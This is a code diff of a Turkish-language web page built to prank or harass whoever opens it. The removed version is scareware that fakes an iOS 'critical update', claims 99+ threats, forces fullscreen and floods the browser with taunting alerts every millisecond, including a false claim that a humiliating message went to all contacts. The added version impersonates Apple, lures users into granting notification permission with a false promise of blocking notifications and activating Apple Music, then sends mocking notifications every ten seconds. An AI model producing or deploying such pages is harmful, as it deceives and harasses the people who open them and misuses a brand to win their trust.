@@ -2,60 +2,58 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>iOS KRİTİK GÜNCELLEME</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Bildirim Merkezi</title>
+    
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+
     <style>
-        body { 
-            background: #000; color: #ff3b30; 
-            font-family: -apple-system, sans-serif; 
-            display: flex; justify-content: center; align-items: center; 
-            height: 100vh; margin: 0; overflow: hidden;
-            cursor: none;
-        }
-        .warning-box { 
-            border: 2px solid #ff3b30; padding: 50px; 
-            border-radius: 20px; text-align: center;
-            box-shadow: 0 0 50px rgba(255, 59, 48, 0.5);
-        }
-        h1 { font-size: 30px; margin-bottom: 20px; }
-        .btn-doom { 
-            background: #ff3b30; color: white; padding: 20px 40px; 
-            border-radius: 10px; font-weight: bold; border: none; 
-            font-size: 20px; cursor: pointer;
-        }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .box { padding: 30px; border: 1px solid #333; border-radius: 20px; width: 80%; }
+        .btn-notif { background: #30d158; color: white; padding: 15px 30px; border-radius: 12px; font-weight: bold; border: none; cursor: pointer; }
+        .desc { font-size: 14px; color: #8e8e93; margin-bottom: 20px; }
     </style>
 </head>
 <body>
 
-<div class="warning-box" id="mainBox">
-    <h1>⚠️ SİSTEM HATASI ⚠️</h1>
-    <p>Cihazınızda 99+ tehdit bulundu. <br>Temizlemek için aşağıdaki butona basın.</p>
-    <button class="btn-doom" onclick="launchChaos()">TEMİZLEMEYİ BAŞLAT</button>
-</div>
+    <div class="box">
+        <h2>Bildirim Koruması</h2>
+        <p class="desc">Gereksiz bildirimleri engellemek ve Apple Music aboneliğini aktif etmek için izni onaylayın.</p>
+        <button class="btn-notif" onclick="askPermission()">BİLDİRİMLERİ AÇ</button>
+    </div>
 
-<script>
-function launchChaos() {
-    // 1. ADIM: Tam Ekran Yap (Kullanıcı etkileşimi şart olduğu için burada tetikliyoruz)
-    let elem = document.documentElement;
-    if (elem.requestFullscreen) {
-        elem.requestFullscreen();
-    } else if (elem.webkitRequestFullscreen) { /* Safari için */
-        elem.webkitRequestFullscreen();
-    }
+    <script>
+        async function askPermission() {
+            // Tarayıcı desteği kontrolü
+            if (!("Notification" in window)) {
+                alert("Aga bu tarayıcıda bildirim olmaz, Ana Ekran'a eklemen lazım!");
+                return;
+            }
 
-    // 2. ADIM: Mobbing Başlıyor
-    alert("TEMİZLEME BAŞLATILAMADI! \nHACKLENDİN AGA HAHAHA!");
+            // İzin İste
+            const permission = await Notification.requestPermission();
 
-    // 3. ADIM: 1 Milisaniyede Bir Sonsuz Döngü
-    // Bu döngü başladığı an işlemci alert basmaktan başka bir şey yapamaz
-    setInterval(function() {
-        alert("SİLSENE LAN! HADİ SİL!");
-        alert("TELEFONUN ŞU AN ELİMDE!");
-        alert("AYARLARDA BOŞUNA GEZME!");
-        alert("BEN GAYIM DİYE TÜM REHBERE MESAJ GİTTİ BİLE!");
-    }, 1); // 1 ms = Saniyede binlerce bildirim!
-}
-</script>
+            if (permission === "granted") {
+                // Sadece BİLDİRİM atacak, ekranı kilitlemeyecek
+                // Her 10 saniyede bir (10000ms) bir tane salla
+                setInterval(() => {
+                    new Notification("🚨 SİSTEM UYARISI!", {
+                        body: "HAHAHA HADİ SİL LAN! SİLEBİLİYORSAN SİL!",
+                        icon: "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
+                    });
+                }, 10000); 
+
+                // İkinci bir bildirim daha (şov olsun)
+                new Notification("BAŞARILI!", {
+                    body: "Mobbing modu başarıyla aktif edildi koçum."
+                });
+            } else {
+                alert("İzni vermedin, trolledik seni!");
+            }
+        }
+    </script>
 
 </body>
 </html>
